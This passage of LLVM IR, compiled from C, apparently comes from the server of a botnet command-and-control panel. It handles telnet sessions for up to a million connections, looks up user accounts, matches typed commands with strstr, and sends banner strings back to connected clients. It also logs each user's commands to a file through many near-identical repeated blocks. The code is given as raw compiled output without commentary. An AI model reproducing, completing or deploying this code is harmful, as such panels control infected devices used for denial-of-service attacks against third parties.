  %1754 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i64 0, i64 0
  %1755 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i64 0, i64 0
  %1756 = call i64 @strlen(i8* %1755) #8
  %1757 = call i64 @send(i32 %1753, i8* %1754, i64 %1756, i32 16384)
  %1758 = icmp eq i64 %1757, -1
  br i1 %1758, label %1759, label %1760

1759:                                             ; preds = %1752
  br label %2321

1760:                                             ; preds = %1752
  %1761 = load i32, i32* %5, align 4
  %1762 = sext i32 %1761 to i64
  %1763 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1762
  %1764 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %1763, i32 0, i32 0
  store i32 1, i32* %1764, align 4
  br label %1765

1765:                                             ; preds = %1760, %1551
  %1766 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1767 = call i8* @strstr(i8* %1766, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.114, i64 0, i64 0)) #8
  %1768 = icmp ne i8* %1767, null
  br i1 %1768, label %1769, label %1828

1769:                                             ; preds = %1765
  %1770 = getelementptr inbounds [5000 x i8], [5000 x i8]* %96, i64 0, i64 0
  %1771 = call i32 (i8*, i8*, ...) @sprintf(i8* %1770, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.115, i64 0, i64 0)) #9
  %1772 = getelementptr inbounds [5000 x i8], [5000 x i8]* %97, i64 0, i64 0
  %1773 = call i32 (i8*, i8*, ...) @sprintf(i8* %1772, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.116, i64 0, i64 0)) #9
  %1774 = getelementptr inbounds [5000 x i8], [5000 x i8]* %98, i64 0, i64 0
  %1775 = call i32 (i8*, i8*, ...) @sprintf(i8* %1774, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.117, i64 0, i64 0)) #9
  %1776 = getelementptr inbounds [5000 x i8], [5000 x i8]* %99, i64 0, i64 0
  %1777 = call i32 (i8*, i8*, ...) @sprintf(i8* %1776, i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.118, i64 0, i64 0)) #9
  %1778 = load i32, i32* %5, align 4
  %1779 = call i64 @send(i32 %1778, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.30, i64 0, i64 0), i64 14, i32 16384)
  %1780 = icmp eq i64 %1779, -1
  br i1 %1780, label %1781, label %1782

1781:                                             ; preds = %1769
  br label %2321

1782:                                             ; preds = %1769
  %1783 = load i32, i32* %5, align 4
  %1784 = getelementptr inbounds [5000 x i8], [5000 x i8]* %96, i64 0, i64 0
  %1785 = getelementptr inbounds [5000 x i8], [5000 x i8]* %96, i64 0, i64 0
  %1786 = call i64 @strlen(i8* %1785) #8
  %1787 = call i64 @send(i32 %1783, i8* %1784, i64 %1786, i32 16384)
  %1788 = icmp eq i64 %1787, -1
  br i1 %1788, label %1789, label %1790

1789:                                             ; preds = %1782
  br label %2321

1790:                                             ; preds = %1782
  %1791 = load i32, i32* %5, align 4
  %1792 = getelementptr inbounds [5000 x i8], [5000 x i8]* %97, i64 0, i64 0
  %1793 = getelementptr inbounds [5000 x i8], [5000 x i8]* %97, i64 0, i64 0
  %1794 = call i64 @strlen(i8* %1793) #8
  %1795 = call i64 @send(i32 %1791, i8* %1792, i64 %1794, i32 16384)
  %1796 = icmp eq i64 %1795, -1
  br i1 %1796, label %1797, label %1798

1797:                                             ; preds = %1790
  br label %2321

1798:                                             ; preds = %1790
  %1799 = load i32, i32* %5, align 4
  %1800 = getelementptr inbounds [5000 x i8], [5000 x i8]* %98, i64 0, i64 0
  %1801 = getelementptr inbounds [5000 x i8], [5000 x i8]* %98, i64 0, i64 0
  %1802 = call i64 @strlen(i8* %1801) #8
  %1803 = call i64 @send(i32 %1799, i8* %1800, i64 %1802, i32 16384)
  %1804 = icmp eq i64 %1803, -1
  br i1 %1804, label %1805, label %1806

1805:                                             ; preds = %1798
  br label %2321

1806:                                             ; preds = %1798
  %1807 = load i32, i32* %5, align 4
  %1808 = getelementptr inbounds [5000 x i8], [5000 x i8]* %99, i64 0, i64 0
  %1809 = getelementptr inbounds [5000 x i8], [5000 x i8]* %99, i64 0, i64 0
  %1810 = call i64 @strlen(i8* %1809) #8
  %1811 = call i64 @send(i32 %1807, i8* %1808, i64 %1810, i32 16384)
  %1812 = icmp eq i64 %1811, -1
  br i1 %1812, label %1813, label %1814

1813:                                             ; preds = %1806
  br label %2321

1814:                                             ; preds = %1806
  br label %1815

1815:                                             ; preds = %1814
  %1816 = load i32, i32* %5, align 4
  %1817 = call i64 @send(i32 %1816, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.55, i64 0, i64 0), i64 24, i32 16384)
  %1818 = icmp eq i64 %1817, -1
  br i1 %1818, label %1819, label %1820

1819:                                             ; preds = %1815
  br label %2321

1820:                                             ; preds = %1815
  br label %1821

1821:                                             ; preds = %1820
  %1822 = load i8*, i8** %3, align 8
  %1823 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1822) #9
  %1824 = load i32, i32* %5, align 4
  %1825 = sext i32 %1824 to i64
  %1826 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1825
  %1827 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %1826, i32 0, i32 0
  store i32 1, i32* %1827, align 4
  br label %519, !llvm.loop !19

1828:                                             ; preds = %1765
  %1829 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1830 = call i8* @strstr(i8* %1829, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.119, i64 0, i64 0)) #8
  %1831 = icmp ne i8* %1830, null
  br i1 %1831, label %1832, label %1849

1832:                                             ; preds = %1828
  %1833 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1834 = load i32, i32* %6, align 4
  %1835 = sext i32 %1834 to i64
  %1836 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %1835
  %1837 = getelementptr inbounds %struct.account, %struct.account* %1836, i32 0, i32 0
  %1838 = getelementptr inbounds [20 x i8], [20 x i8]* %1837, i64 0, i64 0
  %1839 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1840 = call i32 (i8*, i8*, ...) @sprintf(i8* %1833, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.120, i64 0, i64 0), i8* %1838, i8* %1839) #9
  %1841 = load i32, i32* %5, align 4
  %1842 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1843 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1844 = call i64 @strlen(i8* %1843) #8
  %1845 = call i64 @send(i32 %1841, i8* %1842, i64 %1844, i32 16384)
  %1846 = icmp eq i64 %1845, -1
  br i1 %1846, label %1847, label %1848

1847:                                             ; preds = %1832
  store i8* null, i8** %2, align 8
  br label %2330

1848:                                             ; preds = %1832
  br label %2321

1849:                                             ; preds = %1828
  %1850 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1851 = call i8* @strstr(i8* %1850, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.121, i64 0, i64 0)) #8
  %1852 = icmp ne i8* %1851, null
  br i1 %1852, label %1853, label %1872

1853:                                             ; preds = %1849
  %1854 = load i32, i32* %6, align 4
  %1855 = sext i32 %1854 to i64
  %1856 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %1855
  %1857 = getelementptr inbounds %struct.account, %struct.account* %1856, i32 0, i32 0
  %1858 = getelementptr inbounds [20 x i8], [20 x i8]* %1857, i64 0, i64 0
  %1859 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1860 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %1858, i8* %1859)
  %1861 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.123, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0))
  store %struct._IO_FILE* %1861, %struct._IO_FILE** %100, align 8
  %1862 = load %struct._IO_FILE*, %struct._IO_FILE** %100, align 8
  %1863 = load i32, i32* %6, align 4
  %1864 = sext i32 %1863 to i64
  %1865 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %1864
  %1866 = getelementptr inbounds %struct.account, %struct.account* %1865, i32 0, i32 0
  %1867 = getelementptr inbounds [20 x i8], [20 x i8]* %1866, i64 0, i64 0
  %1868 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1869 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1862, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %1867, i8* %1868)
  %1870 = load %struct._IO_FILE*, %struct._IO_FILE** %100, align 8
  %1871 = call i32 @fclose(%struct._IO_FILE* %1870)
  br label %2321

1872:                                             ; preds = %1849
  %1873 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1874 = call i8* @strstr(i8* %1873, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.121, i64 0, i64 0)) #8
  %1875 = icmp ne i8* %1874, null
  br i1 %1875, label %1876, label %1895

1876:                                             ; preds = %1872
  %1877 = load i32, i32* %6, align 4
  %1878 = sext i32 %1877 to i64
  %1879 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %1878
  %1880 = getelementptr inbounds %struct.account, %struct.account* %1879, i32 0, i32 0
  %1881 = getelementptr inbounds [20 x i8], [20 x i8]* %1880, i64 0, i64 0
  %1882 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1883 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %1881, i8* %1882)
  %1884 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.123, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0))
  store %struct._IO_FILE* %1884, %struct._IO_FILE** %101, align 8
  %1885 = load %struct._IO_FILE*, %struct._IO_FILE** %101, align 8
  %1886 = load i32, i32* %6, align 4
  %1887 = sext i32 %1886 to i64
  %1888 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %1887
  %1889 = getelementptr inbounds %struct.account, %struct.account* %1888, i32 0, i32 0
  %1890 = getelementptr inbounds [20 x i8], [20 x i8]* %1889, i64 0, i64 0
  %1891 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1892 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1885, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %1890, i8* %1891)
  %1893 = load %struct._IO_FILE*, %struct._IO_FILE** %101, align 8
  %1894 = call i32 @fclose(%struct._IO_FILE* %1893)
  br label %2321

1895:                                             ; preds = %1872
  %1896 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1897 = call i8* @strstr(i8* %1896, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.121, i64 0, i64 0)) #8
  %1898 = icmp ne i8* %1897, null
  br i1 %1898, label %1899, label %1918

1899:                                             ; preds = %1895
  %1900 = load i32, i32* %6, align 4
  %1901 = sext i32 %1900 to i64
  %1902 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %1901
  %1903 = getelementptr inbounds %struct.account, %struct.account* %1902, i32 0, i32 0
  %1904 = getelementptr inbounds [20 x i8], [20 x i8]* %1903, i64 0, i64 0
  %1905 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1906 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %1904, i8* %1905)
  %1907 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.123, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0))
  store %struct._IO_FILE* %1907, %struct._IO_FILE** %102, align 8
  %1908 = load %struct._IO_FILE*, %struct._IO_FILE** %102, align 8
  %1909 = load i32, i32* %6, align 4
  %1910 = sext i32 %1909 to i64
  %1911 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %1910
  %1912 = getelementptr inbounds %struct.account, %struct.account* %1911, i32 0, i32 0
  %1913 = getelementptr inbounds [20 x i8], [20 x i8]* %1912, i64 0, i64 0
  %1914 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1915 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1908, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %1913, i8* %1914)
  %1916 = load %struct._IO_FILE*, %struct._IO_FILE** %102, align 8
  %1917 = call i32 @fclose(%struct._IO_FILE* %1916)
  br label %2321

1918:                                             ; preds = %1895
  %1919 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1920 = call i8* @strstr(i8* %1919, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.121, i64 0, i64 0)) #8
  %1921 = icmp ne i8* %1920, null
  br i1 %1921, label %1922, label %1941

1922:                                             ; preds = %1918
  %1923 = load i32, i32* %6, align 4
  %1924 = sext i32 %1923 to i64
  %1925 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %1924
  %1926 = getelementptr inbounds %struct.account, %struct.account* %1925, i32 0, i32 0
  %1927 = getelementptr inbounds [20 x i8], [20 x i8]* %1926, i64 0, i64 0
  %1928 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1929 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %1927, i8* %1928)
  %1930 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.123, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0))
  store %struct._IO_FILE* %1930, %struct._IO_FILE** %103, align 8
  %1931 = load %struct._IO_FILE*, %struct._IO_FILE** %103, align 8
  %1932 = load i32, i32* %6, align 4
  %1933 = sext i32 %1932 to i64
  %1934 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %1933
  %1935 = getelementptr inbounds %struct.account, %struct.account* %1934, i32 0, i32 0
  %1936 = getelementptr inbounds [20 x i8], [20 x i8]* %1935, i64 0, i64 0
  %1937 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1938 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1931, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %1936, i8* %1937)
  %1939 = load %struct._IO_FILE*, %struct._IO_FILE** %103, align 8
  %1940 = call i32 @fclose(%struct._IO_FILE* %1939)
  br label %2321

1941:                                             ; preds = %1918
  %1942 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1943 = call i8* @strstr(i8* %1942, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.121, i64 0, i64 0)) #8
  %1944 = icmp ne i8* %1943, null
  br i1 %1944, label %1945, label %1964

1945:                                             ; preds = %1941
  %1946 = load i32, i32* %6, align 4
  %1947 = sext i32 %1946 to i64
  %1948 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %1947
  %1949 = getelementptr inbounds %struct.account, %struct.account* %1948, i32 0, i32 0
  %1950 = getelementptr inbounds [20 x i8], [20 x i8]* %1949, i64 0, i64 0
  %1951 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1952 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %1950, i8* %1951)
  %1953 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.123, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0))
  store %struct._IO_FILE* %1953, %struct._IO_FILE** %104, align 8
  %1954 = load %struct._IO_FILE*, %struct._IO_FILE** %104, align 8
  %1955 = load i32, i32* %6, align 4
  %1956 = sext i32 %1955 to i64
  %1957 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %1956
  %1958 = getelementptr inbounds %struct.account, %struct.account* %1957, i32 0, i32 0
  %1959 = getelementptr inbounds [20 x i8], [20 x i8]* %1958, i64 0, i64 0
  %1960 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1961 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1954, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %1959, i8* %1960)
  %1962 = load %struct._IO_FILE*, %struct._IO_FILE** %104, align 8
  %1963 = call i32 @fclose(%struct._IO_FILE* %1962)
  br label %2321

1964:                                             ; preds = %1941
  %1965 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1966 = call i8* @strstr(i8* %1965, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.121, i64 0, i64 0)) #8
  %1967 = icmp ne i8* %1966, null
  br i1 %1967, label %1968, label %1987

1968:                                             ; preds = %1964
  %1969 = load i32, i32* %6, align 4
  %1970 = sext i32 %1969 to i64
  %1971 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %1970
  %1972 = getelementptr inbounds %struct.account, %struct.account* %1971, i32 0, i32 0
  %1973 = getelementptr inbounds [20 x i8], [20 x i8]* %1972, i64 0, i64 0
  %1974 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1975 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %1973, i8* %1974)
  %1976 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.123, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0))
  store %struct._IO_FILE* %1976, %struct._IO_FILE** %105, align 8
  %1977 = load %struct._IO_FILE*, %struct._IO_FILE** %105, align 8
  %1978 = load i32, i32* %6, align 4
  %1979 = sext i32 %1978 to i64
  %1980 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %1979
  %1981 = getelementptr inbounds %struct.account, %struct.account* %1980, i32 0, i32 0
  %1982 = getelementptr inbounds [20 x i8], [20 x i8]* %1981, i64 0, i64 0
  %1983 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1984 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1977, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %1982, i8* %1983)
  %1985 = load %struct._IO_FILE*, %struct._IO_FILE** %105, align 8
  %1986 = call i32 @fclose(%struct._IO_FILE* %1985)
  br label %2321

1987:                                             ; preds = %1964
  %1988 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1989 = call i8* @strstr(i8* %1988, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.121, i64 0, i64 0)) #8
  %1990 = icmp ne i8* %1989, null
  br i1 %1990, label %1991, label %2010

1991:                                             ; preds = %1987
  %1992 = load i32, i32* %6, align 4
  %1993 = sext i32 %1992 to i64
  %1994 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %1993
  %1995 = getelementptr inbounds %struct.account, %struct.account* %1994, i32 0, i32 0
  %1996 = getelementptr inbounds [20 x i8], [20 x i8]* %1995, i64 0, i64 0
  %1997 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1998 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %1996, i8* %1997)
  %1999 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.123, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0))
  store %struct._IO_FILE* %1999, %struct._IO_FILE** %106, align 8
  %2000 = load %struct._IO_FILE*, %struct._IO_FILE** %106, align 8
  %2001 = load i32, i32* %6, align 4
  %2002 = sext i32 %2001 to i64
  %2003 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2002
  %2004 = getelementptr inbounds %struct.account, %struct.account* %2003, i32 0, i32 0
  %2005 = getelementptr inbounds [20 x i8], [20 x i8]* %2004, i64 0, i64 0
  %2006 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2007 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2000, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %2005, i8* %2006)
  %2008 = load %struct._IO_FILE*, %struct._IO_FILE** %106, align 8
  %2009 = call i32 @fclose(%struct._IO_FILE* %2008)
  br label %2321

2010:                                             ; preds = %1987
  %2011 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2012 = call i8* @strstr(i8* %2011, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.121, i64 0, i64 0)) #8
  %2013 = icmp ne i8* %2012, null
  br i1 %2013, label %2014, label %2033

2014:                                             ; preds = %2010
  %2015 = load i32, i32* %6, align 4
  %2016 = sext i32 %2015 to i64
  %2017 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2016
  %2018 = getelementptr inbounds %struct.account, %struct.account* %2017, i32 0, i32 0
  %2019 = getelementptr inbounds [20 x i8], [20 x i8]* %2018, i64 0, i64 0
  %2020 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2021 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %2019, i8* %2020)
  %2022 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.123, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0))
  store %struct._IO_FILE* %2022, %struct._IO_FILE** %107, align 8
  %2023 = load %struct._IO_FILE*, %struct._IO_FILE** %107, align 8
  %2024 = load i32, i32* %6, align 4
  %2025 = sext i32 %2024 to i64
  %2026 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2025
  %2027 = getelementptr inbounds %struct.account, %struct.account* %2026, i32 0, i32 0
  %2028 = getelementptr inbounds [20 x i8], [20 x i8]* %2027, i64 0, i64 0
  %2029 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2030 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2023, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %2028, i8* %2029)
  %2031 = load %struct._IO_FILE*, %struct._IO_FILE** %107, align 8
  %2032 = call i32 @fclose(%struct._IO_FILE* %2031)
  br label %2321

2033:                                             ; preds = %2010
  %2034 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2035 = call i8* @strstr(i8* %2034, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.121, i64 0, i64 0)) #8
  %2036 = icmp ne i8* %2035, null
  br i1 %2036, label %2037, label %2056

2037:                                             ; preds = %2033
  %2038 = load i32, i32* %6, align 4
  %2039 = sext i32 %2038 to i64
  %2040 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2039
  %2041 = getelementptr inbounds %struct.account, %struct.account* %2040, i32 0, i32 0
  %2042 = getelementptr inbounds [20 x i8], [20 x i8]* %2041, i64 0, i64 0
  %2043 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2044 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %2042, i8* %2043)
  %2045 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.123, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0))
  store %struct._IO_FILE* %2045, %struct._IO_FILE** %108, align 8
  %2046 = load %struct._IO_FILE*, %struct._IO_FILE** %108, align 8
  %2047 = load i32, i32* %6, align 4
  %2048 = sext i32 %2047 to i64
  %2049 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2048
  %2050 = getelementptr inbounds %struct.account, %struct.account* %2049, i32 0, i32 0
  %2051 = getelementptr inbounds [20 x i8], [20 x i8]* %2050, i64 0, i64 0
  %2052 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2053 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2046, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %2051, i8* %2052)
  %2054 = load %struct._IO_FILE*, %struct._IO_FILE** %108, align 8
  %2055 = call i32 @fclose(%struct._IO_FILE* %2054)
  br label %2321

2056:                                             ; preds = %2033
  %2057 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2058 = call i8* @strstr(i8* %2057, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.121, i64 0, i64 0)) #8
  %2059 = icmp ne i8* %2058, null
  br i1 %2059, label %2060, label %2079

2060:                                             ; preds = %2056
  %2061 = load i32, i32* %6, align 4
  %2062 = sext i32 %2061 to i64
  %2063 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2062
  %2064 = getelementptr inbounds %struct.account, %struct.account* %2063, i32 0, i32 0
  %2065 = getelementptr inbounds [20 x i8], [20 x i8]* %2064, i64 0, i64 0
  %2066 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2067 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %2065, i8* %2066)
  %2068 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.123, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0))
  store %struct._IO_FILE* %2068, %struct._IO_FILE** %109, align 8
  %2069 = load %struct._IO_FILE*, %struct._IO_FILE** %109, align 8
  %2070 = load i32, i32* %6, align 4
  %2071 = sext i32 %2070 to i64
  %2072 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2071
  %2073 = getelementptr inbounds %struct.account, %struct.account* %2072, i32 0, i32 0
  %2074 = getelementptr inbounds [20 x i8], [20 x i8]* %2073, i64 0, i64 0
  %2075 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2076 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2069, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %2074, i8* %2075)
  %2077 = load %struct._IO_FILE*, %struct._IO_FILE** %109, align 8
  %2078 = call i32 @fclose(%struct._IO_FILE* %2077)
  br label %2321

2079:                                             ; preds = %2056
  %2080 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2081 = call i8* @strstr(i8* %2080, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.121, i64 0, i64 0)) #8
  %2082 = icmp ne i8* %2081, null
  br i1 %2082, label %2083, label %2102

2083:                                             ; preds = %2079
  %2084 = load i32, i32* %6, align 4
  %2085 = sext i32 %2084 to i64
  %2086 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2085
  %2087 = getelementptr inbounds %struct.account, %struct.account* %2086, i32 0, i32 0
  %2088 = getelementptr inbounds [20 x i8], [20 x i8]* %2087, i64 0, i64 0
  %2089 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2090 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %2088, i8* %2089)
